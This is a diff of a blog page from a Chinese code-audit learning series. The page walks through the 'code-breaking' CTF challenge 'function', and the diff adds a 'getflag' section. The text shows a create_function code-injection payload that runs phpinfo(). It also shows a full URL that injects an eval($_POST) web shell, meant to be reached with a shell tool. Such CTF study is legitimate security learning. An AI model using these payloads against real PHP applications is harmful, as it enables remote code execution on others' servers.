@@ -101,7 +101,8 @@
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-a483c19b458e9ff0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-d2935ace079d9a59.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-23fc39727c1336d8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:updated_time" content="2019-05-14T09:57:47.801Z">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-93069e3024251492.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2019-05-14T10:36:32.583Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="code-breaking-function">
 <meta name="twitter:description" content="本篇属于我的代码审计学习系列 function题目代码： 123456789&amp;lt;?php$action = $_GET[&apos;action&apos;] ?? &apos;&apos;;$arg = $_GET[&apos;arg&apos;] ?? &apos;&apos;;if(preg_match(&apos;/^[a-z0-9_]*$/isD&apos;, $action)) &amp;#123;    show_source(__FILE__);&amp;#125; else &amp;#123;">
@@ -338,7 +339,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  624
+                  668
                 </span>
               
 
@@ -417,6 +418,10 @@
 <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">action</span>=%<span class="number">5</span>ccreate_function&amp;arg=)&#123;return <span class="string">'yml'</span>;&#125;phpinfo();/*</span><br></pre></td></tr></table></figure>
 <p><img src="https://upload-images.jianshu.io/upload_images/13385151-23fc39727c1336d8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
 <p>成功实现代码执行</p>
+<h1 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h1><p>可以代码执行后我们就可以使用eval函数来利用了</p>
+<pre><code>http://119.3.232.233:8087/?action=%5ccreate_function&amp;arg=return &apos;121&apos;;}eval($_POST[&apos;a&apos;]);/*){
+</code></pre><p>工具连接</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/13385151-93069e3024251492.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="12.jpg"></p>
 
       
     </div>
@@ -673,7 +678,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#function"><span class="nav-number">1.</span> <span class="nav-text">function</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#bypass正则"><span class="nav-number">1.1.</span> <span class="nav-text">bypass正则</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#getshell"><span class="nav-number">1.2.</span> <span class="nav-text">getshell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#思考"><span class="nav-number">2.</span> <span class="nav-text">思考</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#function"><span class="nav-number">1.</span> <span class="nav-text">function</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#bypass正则"><span class="nav-number">1.1.</span> <span class="nav-text">bypass正则</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#getshell"><span class="nav-number">1.2.</span> <span class="nav-text">getshell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#思考"><span class="nav-number">2.</span> <span class="nav-text">思考</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#getflag"><span class="nav-number">3.</span> <span class="nav-text">getflag</span></a></li></ol></div>
             
 
           </div>
